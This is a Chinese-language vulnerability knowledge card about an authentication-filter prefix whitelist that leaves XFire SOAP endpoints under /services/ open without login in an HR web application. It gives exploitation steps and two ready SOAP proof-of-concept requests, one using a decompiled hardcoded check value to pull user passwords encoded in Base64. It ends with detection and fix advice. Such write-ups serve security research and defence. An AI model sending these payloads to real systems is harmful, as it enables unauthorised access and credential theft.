---
id: web-java-framework-xfire-services-filter-whitelist-unauth-invoke
title: XFire /services/* 被认证 Filter 前缀白名单放行：SOAP 终点未授权调用 serviceClass 公共方法
type: scenario
domain: web
path: web/java/framework
technique: java-xfire-filter-prefix-whitelist-unauth-soap-invoke
aliases:
- XFire 未授权
- services.xml 未授权
- XFireConfigurableServlet
- /services/ 白名单绕过
- SOAP 端点未授权
- HireKeywordFilter 绕过
- getEToken 密码泄露
tags:
- java
- xfire
- soap
- webservice
- auth-bypass
- filter-whitelist
- credential-disclosure
- hardcoded-key
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-17
  verified_at: '2026-11-08T09:12:30+08:00'
  notes: 已对照原文核对：图02/11/12 显示 HireKeywordFilter 映射 /*，图12 反编译确认 uri.startsWith(/services/) 时直接 chain.doFilter 并跳过 isLogin 分支；图03/04 显示 web.xml 将 XFireConfigurableServlet 映射 /services/* 并加载 META-INF/xfire/services.xml；图05 的 service/serviceClass 清单、图23/24/25/26 的 getEToken 返回值与 checkKey 硬编码常量均一致。原文未写产品版本（仅称版本比较低），affected_versions 留空正确。未验证点：卡内对 isLogin 跳过的表述依据 doFilter 结构推断，原文未单独实测无 Cookie 访问。
---

## 一句话结论

当 Java 应用的认证 Filter 用 `uri.startsWith("/services/")` 把整个 WebService 前缀直接放行时，`services.xml` 里声明的每个 XFire `<service>` 都会变成无需登录即可调用的 SOAP 终点；攻击者只要枚举 service 名与其 `serviceClass` 公共方法，就能在未授权状态下调用业务方法（本例中直接拉取全量用户的 base64 密码）。

## 原理

- **XFire 的路由方式**：`web.xml` 把 `org.codehaus.xfire.transport.http.XFireConfigurableServlet` 映射到 `/services/*` 与 `/servlet/XFireServlet/*`；该 Servlet 从 `META-INF/xfire/services.xml`（可由 `config` init-param 覆盖）加载配置，每个 `<service>` 的 `<name>` 就是 URL 段（`/services/HrChangeInfoService`），`<namespace>` 是 SOAP 命名空间，`<serviceClass>` 指向实现类。
- **暴露面是"类的所有公共方法"**：XFire 按 SOAP Body 里的元素名反射调用同名 public 方法，参数按 `<arg0>…<argN>` 顺序绑定。因此只要拿到 `services.xml`（源码泄露、备份文件、报错、默认路径猜测），就等于拿到一份可调用的方法清单，不需要 WSDL。
- **Filter 白名单的判断顺序有缺陷**：`HireKeywordFilter.doFilter` 先取 `requestURI`，然后 `if (!uri.startsWith("/templates/attachment/") && !uri.startsWith("/logon/logonService"))`，进入后又判断 `if (uri.startsWith("/services/")) { chain.doFilter(); }`——直接放行，**跳过了后面的 `isLogin(uri)` 会话校验**。也就是说整条 `/services/` 前缀既不需要 session，也不受登录跳转约束；白名单本意是"登录页资源免登录"，被写成了"整个 SOAP 命名空间免登录"。
- **为什么危害不止"能访问"**：SOAP 方法自身的鉴权往往只做弱校验。本例 `HrpService.getEToken(arg0=username, arg1=key, arg2=flag)` 仅调用 `checkKey` 比较一个由固定常量 DES 加密得到的字符串（`B6J2E1E1A3A6E3E5JB` + `090602` 等按 `inFlag` 分支取值），密钥常量硬编码在字节码里；校验通过后 `getSetView(username,"","false")` 查询该用户全部信息，第 566 行把 `username + "," + getPassword()` 做 Base64 返回。Base64 是可逆编码而非加密，等于明文口令批量泄露。
- **与 SQL 注入/XXE 的关系**：同一批未授权终点上还挂着拼接 SQL 与内嵌 XML 解析的方法，白名单放行使这些漏洞从"后台"变成"前台未授权"。

## 触发条件

- 目标使用 XFire（或同类 Servlet 型 WebService 框架）并把 `/services/*` 暴露在公网。
- 认证 Filter/拦截器对 `/services/` 前缀直接放行，或白名单按前缀匹配（`startsWith`）而非精确匹配。
- `services.xml` 可获取（源码泄露、`META-INF` 可读、默认配置、WSDL 未关闭），或能通过字典爆破 service 名。
- SOAP 方法内部没有独立、可靠的鉴权（如仅比较硬编码常量）。

## 利用步骤

1. 访问 `/services/` 或 `/servlet/XFireServlet/` 观察是否为 XFire；尝试 `?wsdl` 获取服务描述。
2. 从源码/备份/报错中读取 `META-INF/xfire/services.xml`，列出 `<name>` 与 `serviceClass`；没有源码时按产品常见名（`HrService`、`HrpService`、`HrChangeInfoService` 等）爆破。
3. 反编译 `serviceClass`，枚举 public 方法及其参数个数，优先找返回敏感数据或执行数据库/文件操作的方法。
4. 构造 SOAP 请求：命名空间取 `<namespace>`，Body 元素为方法名，参数用 `<arg0>…`；`Content-Type: application/xml`，无需 Cookie。
5. 对需要"校验码"的方法，在反编译代码里找硬编码常量或 DES 参数，直接复用（本例 `arg1=c42YFCcwuJdC3uZF9CNUF/kDRn33hWpx`、`arg2=bjzz`）。
6. 拿到返回后解码（Base64/URL）验证数据；继续枚举其它 service 扩大战果。

## PoC

探测与调用未授权终点：

```http
POST /services/HrChangeInfoService HTTP/1.1
Host: target
Content-Type: application/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:hr="http://www.hjsj.com/HrChangeInfoService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:getChangeUsers>
         <arg0>1</arg0>
         <arg1>x</arg1>
         <arg2>y</arg2>
      </hr:getChangeUsers>
   </soapenv:Body>
</soapenv:Envelope>
```

未授权拉取指定用户口令（`arg1` 为反编译得到的硬编码校验值，`arg2` 为分支标记）：

```http
POST /services/HrpService HTTP/1.1
Host: target
Content-Type: application/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:hr="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:getEToken>
         <arg0>admin</arg0>
         <arg1>c42YFCcwuJdC3uZF9CNUF/kDRn33hWpx</arg1>
         <arg2>bjzz</arg2>
      </hr:getEToken>
   </soapenv:Body>
</soapenv:Envelope>
```

响应中的 `<out>` 为 `base64(username,password)`，解码即得口令。

## 变体与关联

- **变体（放行方式）**：`startsWith` 前缀白名单、正则 `.*services.*`、`/services` 不带斜杠、`//services/`、大小写变体、`;jsessionid=` 路径参数拼接。
- **变体（框架）**：Axis/Axis2（`/services/*` + `?wsdl`）、CXF（`/ws/*`）、DWR（`/dwr/*`）、FormService 反射派发，本质都是"框架把公共方法暴露成 HTTP 入口 + 认证缺失"。
- **变体（敏感方法）**：返回全量用户/口令、执行 SQL、解析 XML、读写文件、发起同步任务。
- **关联**：[[web-java-framework-dwr-debug-index-exec-unauth-method-invoke]]（DWR 未授权方法调用）、[[web-java-framework-formservice-reflection-dispatch-unauth]]（FormService 反射派发未授权）、[[web-java-framework-xfire-soap-parameter-sql-injection]]（同一批终点的 SQL 注入）、[[web-generic-auth-403-resource-suffix-path-dictionary-bypass]]（路径匹配绕过认证的通用手法）。
- **边界**：Filter 使用精确路径白名单、SOAP 方法内部有可靠鉴权、`services.xml` 不可获取且 service 名不可猜、网关层统一鉴权时，该链失效。

## 检测与防御

- **修复**：认证白名单只放行确需匿名的精确路径（登录页、静态资源），不要用业务前缀；`/services/*`、`/servlet/XFireServlet/*` 必须要求会话或网关鉴权。
- **收敛暴露面**：生产环境关闭 WSDL（`?wsdl`）、删除未使用的 `<service>`、把 SOAP 端点限制在内网或 mTLS 之后。
- **方法级授权**：每个 SOAP 方法独立校验身份与权限，不依赖前端 Filter；敏感方法（批量查询、导出、口令相关）加二次认证与审计。
- **消除硬编码密钥**：校验码不要用硬编码常量做 DES 比较；口令不得以 Base64 形式返回，服务端只返回脱敏结果。
- **检测**：未带 Cookie 的 `/services/*` POST、请求体出现 `<soapenv:Envelope>` 与 `<arg0>`；同一 IP 短时间内枚举多个 service 名；`getEToken`/`getAllUsers` 等敏感方法被调用；响应中出现长 Base64 串。
